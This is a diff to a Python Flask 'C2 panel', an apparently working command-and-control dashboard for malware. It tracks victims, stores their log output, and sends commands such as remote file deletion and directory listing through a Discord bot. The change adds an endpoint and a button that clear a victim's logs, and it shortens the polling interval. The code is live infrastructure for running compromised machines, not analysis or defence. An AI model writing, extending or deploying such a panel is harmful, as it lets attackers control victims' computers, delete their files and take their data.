@@ -1,4 +1,4 @@
-# c2.py – Complete working panel (file-based storage, HTML included)
+# c2.py – Complete C2 panel with clear logs button, file storage, all commands
 import os, time, json, threading, requests
 from flask import Flask, render_template_string, request, jsonify
 
@@ -59,7 +59,7 @@ def fetch_loop():
                 time.sleep(retry)
         except Exception as e:
             print(f"Fetch error: {e}")
-        time.sleep(3)
+        time.sleep(2)
 
 threading.Thread(target=fetch_loop, daemon=True).start()
 
@@ -86,6 +86,15 @@ def api_logs(victim_id):
     log_queues = data["log_queues"]
     return jsonify(log_queues.get(victim_id, []))
 
+@app.route('/api/clear/<victim_id>', methods=['POST'])
+def clear_logs(victim_id):
+    data = load_data()
+    if victim_id in data["log_queues"]:
+        data["log_queues"][victim_id] = []
+        save_data(data)
+        return jsonify({'success': True})
+    return jsonify({'success': False})
+
 @app.route('/send', methods=['POST'])
 def send_command():
     data = request.json
@@ -104,7 +113,7 @@ def send_command():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ---------- HTML (copy exactly) ----------
+# ---------- Beautiful HTML with clear logs button ----------
 HTML = """
 <!DOCTYPE html>
 <html>
@@ -141,6 +150,8 @@ HTML = """
         .cmd-row input { flex: 1; background: #1e2432; border: 1px solid #2a3242; border-radius: 40px; padding: 10px 16px; color: white; outline: none; font-size: 13px; }
         .cmd-row input:focus { border-color: #a855f7; }
         .log-entry { margin: 8px 0; border-left: 3px solid #a855f7; padding-left: 12px; word-break: break-word; white-space: pre-wrap; }
+        .log-actions { display: flex; justify-content: flex-end; margin-bottom: 12px; }
+        .clear-logs { background: #8b0000; padding: 4px 12px; border-radius: 20px; font-size: 11px; }
         footer { text-align: center; margin-top: 32px; font-size: 12px; color: #4b5563; }
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #1e2432; border-radius: 10px; }
@@ -173,7 +184,10 @@ HTML = """
             <div class="cmd-row"><input id="rmPath" placeholder="!rm path"><button onclick="sendCmd('!rm '+rmPath.value)">Delete</button></div>
             <div class="cmd-row"><input id="lsPath" placeholder="!ls path"><button onclick="sendCmd('!ls '+lsPath.value)">List</button></div>
         </div>
-        <div class="logs" id="logsPanel"></div>
+        <div class="logs">
+            <div class="log-actions"><button class="clear-logs" onclick="clearLogs()">🗑️ Clear Logs</button></div>
+            <div id="logsPanel"></div>
+        </div>
     </div>
     <footer>💡 Commands sent via Discord bot • Results appear here</footer>
 </div>
@@ -207,12 +221,16 @@ HTML = """
     function selectVictim(victimId) {
         currentVictim = victimId;
         document.getElementById('currentVictim').innerHTML = `🎯 TARGET: ${victimId}`;
+        loadLogs(victimId);
+        refreshVictims();
+    }
+
+    function loadLogs(victimId) {
         fetch(`/api/logs/${victimId}`).then(r=>r.json()).then(logs => {
             const panel = document.getElementById('logsPanel');
             panel.innerHTML = '';
             logs.forEach(log => addLog(log));
         });
-        refreshVictims();
     }
 
     function addLog(msg) {
@@ -222,6 +240,18 @@ HTML = """
         div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
         panel.appendChild(div);
         div.scrollIntoView();
+    }
+
+    function clearLogs() {
+        if (!currentVictim) { alert('Select a victim first'); return; }
+        fetch(`/api/clear/${currentVictim}`, { method: 'POST' }).then(r=>r.json()).then(data => {
+            if (data.success) {
+                document.getElementById('logsPanel').innerHTML = '';
+                addLog('Logs cleared.');
+            } else {
+                addLog('Failed to clear logs.');
+            }
+        });
     }
 
     function sendCmd(cmd) {
@@ -242,7 +272,10 @@ HTML = """
         document.getElementById('customCmd').value = '';
     }
 
-    setInterval(refreshVictims, 2000);
+    setInterval(() => {
+        refreshVictims();
+        if (currentVictim) loadLogs(currentVictim);
+    }, 3000);
     refreshVictims();
 </script>
 </body>
